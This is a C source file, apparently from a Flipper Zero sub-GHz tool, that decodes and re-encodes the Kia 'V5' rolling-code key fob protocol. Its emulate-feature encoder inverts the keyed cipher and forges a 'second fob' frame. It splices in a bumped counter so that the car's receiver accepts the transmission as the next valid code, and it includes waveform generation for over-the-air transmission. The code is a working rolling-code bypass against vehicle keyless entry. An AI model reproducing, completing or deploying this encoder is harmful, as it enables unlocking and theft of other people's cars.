#include "kia_v5.h"
#include "protocols_common.h"
#include "protocols_common.h"
#include "keys.h"

#define TAG "KiaV5"

static const SubGhzBlockConst kia_protocol_v5_const = {
    .te_short = 400,
    .te_long = 800,
    .te_delta = 150,
    .min_count_bit_for_found = 67,
};

static void build_keystore_from_mfkey(uint8_t* result) {
    uint64_t mfkey = get_kia_v5_key();
    for(int i = 0; i < 8; i++) {
        result[i] = (uint8_t)((mfkey >> ((7 - i) * 8)) & 0xFFU);
    }
}

static uint8_t keystore_bytes[8] = {0};

// Full 32-bit keyed permutation. The decoder recovers the counter as the low 16
// bits (see mixer_decode); the encoder inverts the FULL permutation to re-encrypt
// a bumped counter. Each inner step shifts the 32-bit state left by one, dropping
// old bit31 and injecting a feedback bit into bit0. The feedback depends linearly
// on old bit31 (via temp = s3 ^ s1), so the dropped bit is recoverable and the
// whole transform is a bijection on the 32-bit state -- kia_v5_mixer_encode_full()
// below is its exact inverse (round-trip proven against real captures).
static uint32_t mixer_decode_full(uint32_t encrypted) {
    uint8_t s0 = (encrypted & 0xFF);
    uint8_t s1 = (encrypted >> 8) & 0xFF;
    uint8_t s2 = (encrypted >> 16) & 0xFF;
    uint8_t s3 = (encrypted >> 24) & 0xFF;

    // Prepare key
    build_keystore_from_mfkey(keystore_bytes);

    int round_index = 1;
    for(size_t i = 0; i < 18; i++) {
        uint8_t r = keystore_bytes[round_index] & 0xFF;
        int steps = 8;
        while(steps > 0) {
            uint8_t base;
            if((s3 & 0x40) == 0) {
                base = (s3 & 0x02) == 0 ? 0x74 : 0x2E;
            } else {
                base = (s3 & 0x02) == 0 ? 0x3A : 0x5C;
            }

            if(s2 & 0x08) {
                base = (((base >> 4) & 0x0F) | ((base & 0x0F) << 4)) & 0xFF;
            }
            if(s1 & 0x01) {
                base = ((base & 0x3F) << 2) & 0xFF;
            }
            if(s0 & 0x01) {
                base = (base << 1) & 0xFF;
            }

            uint8_t temp = (s3 ^ s1) & 0xFF;
            s3 = ((s3 & 0x7F) << 1) & 0xFF;
            if(s2 & 0x80) {
                s3 |= 0x01;
            }
            s2 = ((s2 & 0x7F) << 1) & 0xFF;
            if(s1 & 0x80) {
                s2 |= 0x01;
            }
            s1 = ((s1 & 0x7F) << 1) & 0xFF;
            if(s0 & 0x80) {
                s1 |= 0x01;
            }
            s0 = ((s0 & 0x7F) << 1) & 0xFF;

            uint8_t chk = (base ^ (r ^ temp)) & 0xFF;
            if(chk & 0x80) {
                s0 |= 0x01;
            }
            r = ((r & 0x7F) << 1) & 0xFF;
            steps--;
        }
        round_index = (round_index - 1) & 0x7;
    }
    return ((uint32_t)s3 << 24) | ((uint32_t)s2 << 16) | ((uint32_t)s1 << 8) | (uint32_t)s0;
}

// The counter is the low 16 bits of the permuted state.
static uint16_t mixer_decode(uint32_t encrypted) {
    return (uint16_t)(mixer_decode_full(encrypted) & 0xFFFFU);
}

struct SubGhzProtocolDecoderKiaV5 {
    SubGhzProtocolDecoderBase base;
    SubGhzBlockDecoder decoder;
    SubGhzBlockGeneric generic;
    uint16_t header_count;

    ManchesterState manchester_state;
    uint64_t decoded_data;
    uint64_t saved_key;
    uint8_t bit_count;
    uint64_t yek;
    uint8_t crc;
};

struct SubGhzProtocolEncoderKiaV5 {
    SubGhzProtocolEncoderBase base;
    SubGhzProtocolBlockEncoder encoder;
    SubGhzBlockGeneric generic;

    uint64_t replay_data;
    uint8_t replay_crc;
};

#define KIA_V5_PREAMBLE_PAIRS 200U
#define KIA_V5_SYNC_ENTRIES   4U
#define KIA_V5_DATA_BITS      64U
#define KIA_V5_CRC_BITS       3U
#define KIA_V5_END_ENTRIES    2U
#define KIA_V5_END_GAP_US     10000U
#define KIA_V5_UPLOAD_CAPACITY                          \
    (KIA_V5_PREAMBLE_PAIRS * 2U + KIA_V5_SYNC_ENTRIES + \
     (KIA_V5_DATA_BITS + KIA_V5_CRC_BITS) * 2U + KIA_V5_END_ENTRIES)
_Static_assert(
    KIA_V5_UPLOAD_CAPACITY <= PP_SHARED_UPLOAD_CAPACITY,
    "KIA_V5_UPLOAD_CAPACITY exceeds shared upload slab");

typedef enum {
    KiaV5DecoderStepReset = 0,
    KiaV5DecoderStepCheckPreamble,
    KiaV5DecoderStepData,
} KiaV5DecoderStep;

const SubGhzProtocolDecoder kia_protocol_v5_decoder = {
    .alloc = kia_protocol_decoder_v5_alloc,
    .free = pp_decoder_free_default,
    .feed = kia_protocol_decoder_v5_feed,
    .reset = kia_protocol_decoder_v5_reset,
    .get_hash_data = pp_decoder_hash_blocks,
    .serialize = kia_protocol_decoder_v5_serialize,
    .deserialize = kia_protocol_decoder_v5_deserialize,
    .get_string = kia_protocol_decoder_v5_get_string,
};

#ifdef ENABLE_EMULATE_FEATURE
const SubGhzProtocolEncoder kia_protocol_v5_encoder = {
    .alloc = kia_protocol_encoder_v5_alloc,
    .free = pp_encoder_free,
    .deserialize = kia_protocol_encoder_v5_deserialize,
    .stop = pp_encoder_stop,
    .yield = pp_encoder_yield,
};
#else
const SubGhzProtocolEncoder kia_protocol_v5_encoder = {
    .alloc = NULL,
    .free = NULL,
    .deserialize = NULL,
    .stop = NULL,
    .yield = NULL,
};
#endif

const SubGhzProtocol kia_protocol_v5 = {
    .name = KIA_PROTOCOL_V5_NAME,
    .type = SubGhzProtocolTypeDynamic,
    .flag = SubGhzProtocolFlag_433 | SubGhzProtocolFlag_FM | SubGhzProtocolFlag_Decodable
#ifdef ENABLE_EMULATE_FEATURE
            | SubGhzProtocolFlag_Save | SubGhzProtocolFlag_Load | SubGhzProtocolFlag_Send
#endif
    ,
    .decoder = &kia_protocol_v5_decoder,
    .encoder = &kia_protocol_v5_encoder,
};

static uint8_t kia_v5_calculate_crc(uint64_t data) {
    uint8_t crc = 0;
    for(int i = 63; i >= 0; i--) {
        const uint8_t bit = (data >> i) & 1U;
        const uint8_t shifted_out = (crc >> 1U) & 1U;
        crc = (uint8_t)(((crc & 1U) << 1U) | bit);
        if(shifted_out) {
            crc ^= 3U;
        }
    }
    return (uint8_t)(crc & 3U);
}

#ifdef ENABLE_EMULATE_FEATURE

// Reverse ONE forward mixer step: given the NEW 32-bit state and the step's r
// value, recover the OLD state. Forward shifts the state left by one (new bit_i =
// old bit_{i-1}) with new bit0 = chk.b7 and old bit31 discarded. chk.b7 =
// base.b7 ^ r.b7 ^ (old bit31 ^ old bit15), and base depends only on already-known
// old low bits, so old bit31 = new bit0 ^ base.b7 ^ r.b7 ^ old bit15.
static uint32_t kia_v5_mixer_inv_step(uint32_t nw, uint8_t r) {
    uint8_t newb0 = (uint8_t)(nw & 1U);
    uint32_t old_low = (nw >> 1); // old bits 30..0 (bit31 still unknown)
    uint8_t o0 = (uint8_t)(old_low & 0xFF);
    uint8_t o1 = (uint8_t)((old_low >> 8) & 0xFF);
    uint8_t o2 = (uint8_t)((old_low >> 16) & 0xFF);
    uint8_t o3 = (uint8_t)((old_low >> 24) & 0x7F);

    uint8_t base;
    if((o3 & 0x40) == 0) {
        base = (o3 & 0x02) == 0 ? 0x74 : 0x2E;
    } else {
        base = (o3 & 0x02) == 0 ? 0x3A : 0x5C;
    }
    if(o2 & 0x08) {
        base = (uint8_t)((((base >> 4) & 0x0F) | ((base & 0x0F) << 4)) & 0xFF);
    }
    if(o1 & 0x01) {
        base = (uint8_t)(((base & 0x3F) << 2) & 0xFF);
    }
    if(o0 & 0x01) {
        base = (uint8_t)((base << 1) & 0xFF);
    }

    const uint8_t base7 = (base >> 7) & 1U;
    const uint8_t r7 = (r >> 7) & 1U;
    const uint8_t old_b15 = (o1 >> 7) & 1U;
    const uint8_t old_b31 = base7 ^ r7 ^ old_b15 ^ newb0;
    o3 = (uint8_t)(o3 | (old_b31 << 7));

    return ((uint32_t)o3 << 24) | ((uint32_t)o2 << 16) | ((uint32_t)o1 << 8) | (uint32_t)o0;
}

// Exact inverse of mixer_decode_full: map a permuted state P back to the encrypted
// value E such that mixer_decode_full(E) == P. Used to re-encrypt a synthesized
// (serial, btn, counter) frame so a bumped counter yields a NEW valid hop.
static uint32_t mixer_encode_full(uint32_t state) {
    build_keystore_from_mfkey(keystore_bytes);

    // Reproduce the round_index order the forward transform walked, then unwind it.
    int ri_seq[18];
    int round_index = 1;
    for(int i = 0; i < 18; i++) {
        ri_seq[i] = round_index;
        round_index = (round_index - 1) & 0x7;
    }

    uint32_t nw = state;
    for(int i = 17; i >= 0; i--) {
        // The per-step r register starts at keystore_bytes[ri] and is shifted left
        // once per step; reproduce that sequence so we can unwind steps in reverse.
        uint8_t rvals[8];
        uint8_t r = keystore_bytes[ri_seq[i]] & 0xFF;
        for(int st = 0; st < 8; st++) {
            rvals[st] = r;
            r = (uint8_t)(((r & 0x7F) << 1) & 0xFF);
        }
        for(int st = 7; st >= 0; st--) {
            nw = kia_v5_mixer_inv_step(nw, rvals[st]);
        }
    }
    return nw;
}

void* kia_protocol_encoder_v5_alloc(SubGhzEnvironment* environment) {
    SubGhzProtocolEncoderKiaV5* instance = calloc(1, sizeof(SubGhzProtocolEncoderKiaV5));
    furi_check(instance);

    if(environment) {
        protopirate_keys_load(environment);
    }

    instance->base.protocol = &kia_protocol_v5;
    instance->generic.protocol_name = instance->base.protocol->name;
    instance->encoder.repeat = 6;
    instance->encoder.size_upload = 0;
    instance->encoder.upload = NULL;
    instance->encoder.is_running = false;
    return instance;
}

// Emit ONE data bit as decoder-EXACT differential Manchester. The V5 decoder
// feeds every data pulse through manchester_advance() with the NON-inverted event
// mapping (HIGH pulse -> *High event, LOW pulse -> *Low event -- see the Data
// step in kia_protocol_decoder_v5_feed). A bit is only recovered on a transition
// INTO a Mid state, so the wire symbol depends on the current Manchester state:
//   Mid1: bit1 = HIGH short, LOW short (stay Mid1); bit0 = HIGH long (-> Mid0)
//   Mid0: bit1 = LOW long (-> Mid1);               bit0 = LOW short, HIGH short (stay Mid0)
// This is the precise inverse of the decoder's transition table, so re-decoding
// the emitted waveform reproduces the same bitstream.
static size_t kia_v5_emit_manchester_bit(
    LevelDuration* up,
    size_t i,
    size_t cap,
    bool bit_value,
    ManchesterState* state) {
    const uint32_t te_short = kia_protocol_v5_const.te_short;
    const uint32_t te_long = kia_protocol_v5_const.te_long;
    if(*state == ManchesterStateMid1) {
        if(bit_value) {
            i = pp_emit(up, i, cap, true, te_short);
            i = pp_emit(up, i, cap, false, te_short);
        } else {
            i = pp_emit(up, i, cap, true, te_long);
            *state = ManchesterStateMid0;
        }
    } else {
        if(bit_value) {
            i = pp_emit(up, i, cap, false, te_long);
            *state = ManchesterStateMid1;
        } else {
            i = pp_emit(up, i, cap, false, te_short);
            i = pp_emit(up, i, cap, true, te_short);
        }
    }
    return i;
}

static void kia_protocol_encoder_v5_get_upload(SubGhzProtocolEncoderKiaV5* instance) {
    LevelDuration* upload = instance->encoder.upload;
    const size_t cap = KIA_V5_UPLOAD_CAPACITY;
    const uint32_t te_short = kia_protocol_v5_const.te_short;
    const uint32_t te_long = kia_protocol_v5_const.te_long;
    size_t i = 0;

    // Preamble: te_short HIGH/LOW pairs. The decoder counts these to satisfy
    // header_count > 40 before it will accept the sync.
    for(size_t p = 0; p < KIA_V5_PREAMBLE_PAIRS; p++) {
        i = pp_emit(upload, i, cap, true, te_short);
        i = pp_emit(upload, i, cap, false, te_short);
    }

    // Sync: a single HIGH te_long pulse. In CheckPreamble (header_count > 40) this
    // te_long HIGH switches the decoder into the Data step WITHOUT being consumed
    // by the Manchester machine, whose state is the reset state Mid1. So the first
    // data bit below is decoded starting from Mid1.
    i = pp_emit(upload, i, cap, true, te_long);

    // Sync trailing half-cell: a single LOW te_short. From Mid1 the decoder's
    // Manchester machine maps ShortLow to a no-bit self-reset (stays Mid1), so this
    // consumes no data bit. Its purpose is physical: the first data symbol from Mid1
    // always OPENS with a HIGH pulse, and without this LOW the sync's HIGH te_long
    // would sit directly against that HIGH -> two same-level entries that a real
    // radio merges into one corrupted pulse. Emitting the sync's return-to-LOW makes
    // the sync->data boundary a genuine level transition while leaving the decoded
    // bitstream (which still begins from Mid1) unchanged.
    i = pp_emit(upload, i, cap, false, te_short);

    ManchesterState state = ManchesterStateMid1;
    for(int b = (int)KIA_V5_DATA_BITS - 1; b >= 0; b--) {
        const bool bit_value = ((instance->replay_data >> b) & 1ULL) != 0ULL;
        i = kia_v5_emit_manchester_bit(upload, i, cap, bit_value, &state);
    }

    i = kia_v5_emit_manchester_bit(upload, i, cap, ((instance->replay_crc >> 2U) & 1U) != 0U, &state);
    i = kia_v5_emit_manchester_bit(upload, i, cap, ((instance->replay_crc >> 1U) & 1U) != 0U, &state);
    i = kia_v5_emit_manchester_bit(upload, i, cap, (instance->replay_crc & 1U) != 0U, &state);

    // Data->END transition guard: the final Manchester symbol can close on a LOW
    // pulse (Mid0 bit1 = LOW te_long, or the LOW half of a Mid1 bit1). The END gap
    // below is also LOW, so in that case the last bit's closing pulse would merge
    // into the gap on-air, be reclassified out-of-range, and drop the final CRC bit.
    // Emit a HIGH te_short first when the last pulse is LOW: the decoder already holds
    // all 67 bits (bit_count > 66) and ignores this extra pulse, so the gap stays a
    // clean level transition and every bit survives the merge. When the last pulse is
    // already HIGH the LOW gap is a clean edge and no filler is needed.
    if(i > 0 && !level_duration_get_level(upload[i - 1])) {
        i = pp_emit(upload, i, cap, true, te_short);
    }

    // Terminating idle gap: the V5 decoder only commits its accumulated bits when
    // it sees an out-of-range duration in the Data step. pp_encoder_yield replays
    // the upload back-to-back with no inter-frame gap, so without an explicit
    // out-of-range gap here the decoder never fires on the emitted waveform.
    i = pp_emit(upload, i, cap, false, KIA_V5_END_GAP_US);

    instance->encoder.size_upload = i;
    instance->encoder.front = 0;
}

SubGhzProtocolStatus
    kia_protocol_encoder_v5_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_check(context);
    SubGhzProtocolEncoderKiaV5* instance = context;

    instance->encoder.is_running = false;
    instance->encoder.front = 0;

    if(pp_verify_protocol_name(flipper_format, instance->base.protocol->name) !=
       SubGhzProtocolStatusOk) {
        FURI_LOG_E(TAG, "V5 enc: protocol mismatch");
        return SubGhzProtocolStatusError;
    }

    SubGhzProtocolStatus status =
        subghz_block_generic_deserialize(&instance->generic, flipper_format);
    if(status != SubGhzProtocolStatusOk) {
        FURI_LOG_E(TAG, "V5 enc: generic deserialize failed (%d)", status);
        return status;
    }
    if(instance->generic.data_count_bit < kia_protocol_v5_const.min_count_bit_for_found) {
        FURI_LOG_E(
            TAG, "V5 enc: bit count too low: %u", (unsigned)instance->generic.data_count_bit);
        return SubGhzProtocolStatusErrorValueBitCount;
    }

    // Rolling-code SECOND-FOB synthesis (not a verbatim clone). The 64-bit key is
    // a full per-byte bit-reversal of "yek" = [btn(4) | serial(28) | encrypted(32)]:
    // serial and btn ride in the clear, only the low 32 bits are the keyed hop.
    // mixer_decode_full() recovers the full 32-bit permuted plaintext whose low 16
    // bits are the counter; we splice in the requested (possibly bumped) Cnt and
    // mixer_encode_full() -- the exact inverse of the mixer -- regenerates the hop
    // so the receiver accepts counter+1 as the next valid code. Re-encrypting with
    // the CAPTURED counter reproduces the exact captured frame (bit-identical
    // resend); bumping the counter yields a new, still-decodable frame.
    uint64_t yek_captured = 0;
    for(int i = 0; i < 8; i++) {
        const uint8_t b = (uint8_t)((instance->generic.data >> (i * 8)) & 0xFFU);
        yek_captured |= ((uint64_t)pp_reverse_bits8(b) << ((7 - i) * 8));
    }
    const uint32_t serial = (uint32_t)((yek_captured >> 32) & 0x0FFFFFFFU);
    const uint8_t btn = (uint8_t)((yek_captured >> 60) & 0x0FU);
    const uint32_t encrypted_captured = (uint32_t)(yek_captured & 0xFFFFFFFFU);
    const uint32_t plain_captured = mixer_decode_full(encrypted_captured);

    // Counter: honor the (possibly harness-bumped) Cnt field; else keep captured.
    uint32_t serial_v = UINT32_MAX;
    uint32_t btn_v = UINT32_MAX;
    uint32_t cnt_v = UINT32_MAX;
    pp_encoder_read_fields(flipper_format, &serial_v, &btn_v, &cnt_v, NULL);
    const uint16_t cnt =
        (cnt_v == UINT32_MAX) ? (uint16_t)(plain_captured & 0xFFFFU) : (uint16_t)(cnt_v & 0xFFFFU);

    const uint32_t plaintext_new = (plain_captured & 0xFFFF0000U) | cnt;
    const uint32_t encrypted_new = mixer_encode_full(plaintext_new);

    const uint64_t yek_new =
        ((uint64_t)btn << 60) | ((uint64_t)serial << 32) | (uint64_t)encrypted_new;
    uint64_t data_new = 0;
    for(int i = 0; i < 8; i++) {
        const uint8_t b = (uint8_t)((yek_new >> (i * 8)) & 0xFFU);
        data_new |= ((uint64_t)pp_reverse_bits8(b) << ((7 - i) * 8));
    }

    instance->replay_data = data_new;
    instance->generic.data = data_new;
    instance->generic.serial = serial;
    instance->generic.btn = btn;
    instance->generic.cnt = cnt;

    // CRC is recomputed over the freshly re-encrypted frame so a bumped counter
    // carries a matching CRC (this generator reproduces the captured CRC on a
    // same-counter resend, keeping that path bit-identical).
    instance->replay_crc = kia_v5_calculate_crc(instance->replay_data);

    instance->encoder.repeat = (int32_t)pp_encoder_read_repeat(flipper_format, 6);

    pp_encoder_buffer_ensure(instance, KIA_V5_UPLOAD_CAPACITY);
    kia_protocol_encoder_v5_get_upload(instance);

    instance->encoder.is_running = true;

    FURI_LOG_I(
        TAG,
        "V5 enc ready: data=%08lX%08lX crc=%X repeat=%u size=%zu",
        (uint32_t)(instance->replay_data >> 32),
        (uint32_t)(instance->replay_data & 0xFFFFFFFFULL),
        instance->replay_crc,
        (unsigned)instance->encoder.repeat,
        instance->encoder.size_upload);

    return SubGhzProtocolStatusOk;
}

#endif

static void kia_v5_add_bit(SubGhzProtocolDecoderKiaV5* instance, bool bit) {
    instance->decoded_data = (instance->decoded_data << 1) | (bit ? 1 : 0);
    instance->bit_count++;
}

void* kia_protocol_decoder_v5_alloc(SubGhzEnvironment* environment) {
    SubGhzProtocolDecoderKiaV5* instance = calloc(1, sizeof(SubGhzProtocolDecoderKiaV5));
    furi_check(instance);
    
    if(environment) {
        protopirate_keys_load(environment);
    }

    instance->base.protocol = &kia_protocol_v5;
    instance->generic.protocol_name = instance->base.protocol->name;
    return instance;
}

void kia_protocol_decoder_v5_reset(void* context) {
    furi_check(context);
    SubGhzProtocolDecoderKiaV5* instance = context;
    instance->decoder.parser_step = KiaV5DecoderStepReset;
    instance->header_count = 0;
    instance->bit_count = 0;
    instance->decoded_data = 0;
    instance->saved_key = 0;
    instance->yek = 0;
    instance->crc = 0;
    instance->manchester_state = ManchesterStateMid1;
}

void kia_protocol_decoder_v5_feed(void* context, bool level, uint32_t duration) {
    furi_check(context);
    SubGhzProtocolDecoderKiaV5* instance = context;

    switch(instance->decoder.parser_step) {
    case KiaV5DecoderStepReset:
        if((level) && (DURATION_DIFF(duration, kia_protocol_v5_const.te_short) <
                       kia_protocol_v5_const.te_delta)) {
            instance->decoder.parser_step = KiaV5DecoderStepCheckPreamble;
            instance->decoder.te_last = duration;
            instance->header_count = 1;
            instance->bit_count = 0;
            instance->decoded_data = 0;
            manchester_advance(
                instance->manchester_state,
                ManchesterEventReset,
                &instance->manchester_state,
                NULL);
        }
        break;

    case KiaV5DecoderStepCheckPreamble:
        if(level) {
            if(DURATION_DIFF(duration, kia_protocol_v5_const.te_long) <
               kia_protocol_v5_const.te_delta) {
                if(instance->header_count > 40) {
                    instance->decoder.parser_step = KiaV5DecoderStepData;
                    instance->bit_count = 0;
                    instance->decoded_data = 0;
                    instance->saved_key = 0;
                    instance->header_count = 0;
                } else {
                    instance->decoder.te_last = duration;
                }
            } else if(
                DURATION_DIFF(duration, kia_protocol_v5_const.te_short) <
                kia_protocol_v5_const.te_delta) {
                instance->decoder.te_last = duration;
            } else {
                instance->decoder.parser_step = KiaV5DecoderStepReset;
            }
        } else {
            if((DURATION_DIFF(duration, kia_protocol_v5_const.te_short) <
                kia_protocol_v5_const.te_delta) &&
               (DURATION_DIFF(instance->decoder.te_last, kia_protocol_v5_const.te_short) <
                kia_protocol_v5_const.te_delta)) {
                instance->header_count++;
            } else if(
                (DURATION_DIFF(duration, kia_protocol_v5_const.te_long) <
                 kia_protocol_v5_const.te_delta) &&
                (DURATION_DIFF(instance->decoder.te_last, kia_protocol_v5_const.te_short) <
                 kia_protocol_v5_const.te_delta)) {
                instance->header_count++;
            } else if(
                DURATION_DIFF(instance->decoder.te_last, kia_protocol_v5_const.te_long) <
                kia_protocol_v5_const.te_delta) {
                instance->header_count++;
            } else {
                instance->decoder.parser_step = KiaV5DecoderStepReset;
            }
            instance->decoder.te_last = duration;
        }
        break;

    case KiaV5DecoderStepData: {
        ManchesterEvent event;

        if(DURATION_DIFF(duration, kia_protocol_v5_const.te_short) <
           kia_protocol_v5_const.te_delta) {
            event = level ? ManchesterEventShortHigh : ManchesterEventShortLow;
        } else if(
            DURATION_DIFF(duration, kia_protocol_v5_const.te_long) <
            kia_protocol_v5_const.te_delta) {
            event = level ? ManchesterEventLongHigh : ManchesterEventLongLow;
        } else {
            if(instance->bit_count >= kia_protocol_v5_const.min_count_bit_for_found) {
                instance->generic.data = instance->saved_key;
                // Store exactly min_count_bit_for_found so a saved capture's
                // Bit: field matches the framework's exact-equality deserialize
                // check (was: variable bit_count 64-67 -> "Protocol not found!"
                // when reloading in the receiver/full-dpad info scene).
                instance->generic.data_count_bit =
                    kia_protocol_v5_const.min_count_bit_for_found;

                instance->crc = (uint8_t)(instance->decoded_data & 0x07);

                instance->yek = 0;
                for(int i = 0; i < 8; i++) {
                    uint8_t byte = (instance->generic.data >> (i * 8)) & 0xFF;
                    uint8_t reversed = 0;
                    for(int b = 0; b < 8; b++) {
                        if(byte & (1 << b)) reversed |= (1 << (7 - b));
                    }
                    instance->yek |= ((uint64_t)reversed << ((7 - i) * 8));
                }

                instance->generic.serial = (uint32_t)((instance->yek >> 32) & 0x0FFFFFFF);
                instance->generic.btn = (uint8_t)((instance->yek >> 60) & 0x0F);

                uint32_t encrypted = (uint32_t)(instance->yek & 0xFFFFFFFF);
                instance->generic.cnt = mixer_decode(encrypted);

                FURI_LOG_I(
                    TAG,
                    "Key=%08lX%08lX Sn=%07lX Btn=%X Cnt=%04lX CRC=%X",
                    (uint32_t)(instance->generic.data >> 32),
                    (uint32_t)(instance->generic.data & 0xFFFFFFFF),
                    instance->generic.serial,
                    instance->generic.btn,
                    instance->generic.cnt,
                    instance->crc);

                // The embedded CRC is only 3 bits, so ~1/8 of degenerate bursts
                // (regular PWM -> repeating-tile key like 0x2492492... / 0xB6DB6D...)
                // still pass it. Also reject any key that is a low-entropy repeating
                // pattern -- a real rolling key never is.
                if(instance->base.callback &&
                   instance->crc == kia_v5_calculate_crc(instance->saved_key) &&
                   !pp_value_is_degenerate(instance->saved_key, 8))
                    instance->base.callback(&instance->base, instance->base.context);
            }

            instance->decoder.parser_step = KiaV5DecoderStepReset;
            break;
        }

        bool data_bit;
        if(instance->bit_count <= 66 &&
           manchester_advance(
               instance->manchester_state, event, &instance->manchester_state, &data_bit)) {
            kia_v5_add_bit(instance, data_bit);

            if(instance->bit_count == 64) {
                instance->saved_key = instance->decoded_data;
                instance->decoded_data = 0;
            }
        }

        instance->decoder.te_last = duration;
        break;
    }
    }
}

SubGhzProtocolStatus kia_protocol_decoder_v5_serialize(
    void* context,
    FlipperFormat* flipper_format,
    SubGhzRadioPreset* preset) {
    furi_check(context);
    SubGhzProtocolDecoderKiaV5* instance = context;

    SubGhzProtocolStatus ret = SubGhzProtocolStatusError;

    ret = subghz_block_generic_serialize(&instance->generic, flipper_format, preset);

    if(ret == SubGhzProtocolStatusOk) {
        // Save decoded fields
        pp_serialize_fields(
            flipper_format,
            PP_FIELD_SERIAL | PP_FIELD_BTN | PP_FIELD_CNT,
            instance->generic.serial,
            instance->generic.btn,
            instance->generic.cnt,
            0);

        uint32_t crc_temp = instance->crc;
        flipper_format_write_uint32(flipper_format, "CRC", &crc_temp, 1);

        // Save raw bit data for exact reproduction (since V5 has complex bit reversal)
        uint32_t raw_high = (uint32_t)(instance->generic.data >> 32);
        uint32_t raw_low = (uint32_t)(instance->generic.data & 0xFFFFFFFF);
        flipper_format_write_uint32(flipper_format, "DataHi", &raw_high, 1);
        flipper_format_write_uint32(flipper_format, "DataLo", &raw_low, 1);
        uint32_t yek_high = (uint32_t)(instance->yek >> 32);
        uint32_t yek_low = (uint32_t)(instance->yek & 0xFFFFFFFF);
        flipper_format_write_uint32(flipper_format, "YekHi", &yek_high, 1);
        flipper_format_write_uint32(flipper_format, "YekLo", &yek_low, 1);
    }

    return ret;
}

SubGhzProtocolStatus
    kia_protocol_decoder_v5_deserialize(void* context, FlipperFormat* flipper_format) {
    furi_check(context);
    SubGhzProtocolDecoderKiaV5* instance = context;
    return subghz_block_generic_deserialize_check_count_bit(
        &instance->generic, flipper_format, kia_protocol_v5_const.min_count_bit_for_found);
}

void kia_protocol_decoder_v5_get_string(void* context, FuriString* output) {
    furi_check(context);
    SubGhzProtocolDecoderKiaV5* instance = context;

    uint32_t code_found_hi = instance->generic.data >> 32;
    uint32_t code_found_lo = instance->generic.data & 0x00000000ffffffff;
    uint32_t yek_hi = (uint32_t)(instance->yek >> 32);
    uint32_t yek_lo = (uint32_t)(instance->yek & 0xFFFFFFFF);

    furi_string_cat_printf(
        output,
        "%s %dbit\r\n"
        "Key:%08lX%08lX\r\n"
        "Yek:%08lX%08lX\r\n"
        "Sn:%07lX Btn:%X Cnt:%04lX\r\n"
        "CRC:%X\r\n",
        instance->generic.protocol_name,
        instance->generic.data_count_bit,
        code_found_hi,
        code_found_lo,
        yek_hi,
        yek_lo,
        instance->generic.serial,
        instance->generic.btn,
        instance->generic.cnt,
        instance->crc);
}
